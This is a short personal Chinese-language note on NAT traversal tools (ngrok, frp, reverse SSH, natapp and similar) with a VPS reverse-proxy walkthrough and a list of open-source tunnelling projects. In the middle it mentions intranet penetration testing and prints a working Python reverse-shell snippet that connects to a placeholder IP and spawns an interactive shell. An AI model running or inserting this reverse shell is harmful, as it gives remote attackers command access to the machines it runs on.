---
title: 内网穿透 ngrok
date: 2019-02-21
private:
---
# 内网穿透
都是通过公网做转接: https://zhuanlan.zhihu.com/p/28820926

- ngrok
    流量重放
    ./ngrok -config=ngrok.cfg -subdomain <domain> 80
    ./ngrok -config=ngrok.cfg -hostname xxx.xxx.xxx 80
- frp 支持 tcp, udp, http, https 协议, 高性能
- 用反向隧道的ssh
- lanproxy: 支持tcp流量转发
- natapp: 基于ngrok, 比花生壳好用

# ngrok
参考：https://zhuanlan.zhihu.com/p/28820926 /py-demo/socket/proxy-reverse-server.py
1. 假设我们需要共享的 web 是 python 的 simple http_server， 首先执行 python -m SimpleHTTPServer, 这样本地会绑定 8000 端口
2. 在自己的 vps 上运行 python3 reverse_server.py
3. 在本地运行 python3 reverse_client_proxy.py
3. 接下来我们直接在外网访问 vps 的地址: http://xx.xx.xx.xx:8000 就可以发现能够转发内网的数据了

流程图：

    vps:8000 --> vps:2333 -> server:xx-> server:8000

内网穿透可以用于做内网渗透测试， 内网执行最基本的 python 反弹 shell 脚本：

    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("x.x.x.x",2333))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"]);

# 工具
作者：予墨白 链接：https://www.zhihu.com/question/49629610/answer/190228044

GO实现的：
- longXboy/lunnel  这个功能挺多的看介绍跟frp差不多了
- mirrors/dog-tunnel 这个看起来似乎更多使用

javascript实现的：
- localtunnel/localtunnel  这个就不上档次了，貌似只支持http协议的隧道；不过star数可不比上面两个差；

python实现：
- hauntek/python-ngrokd  见名知义， python版本的ngrok；协议都是一样的

C语言版：
- dosgo/ngrok-c

php实现的；也是予墨白近期的一个作品；
- slince/spike；基于reactphp的io多路复用模型，类似于nodejs的执行方式；简单测评并没有比go语言实现的差太多；
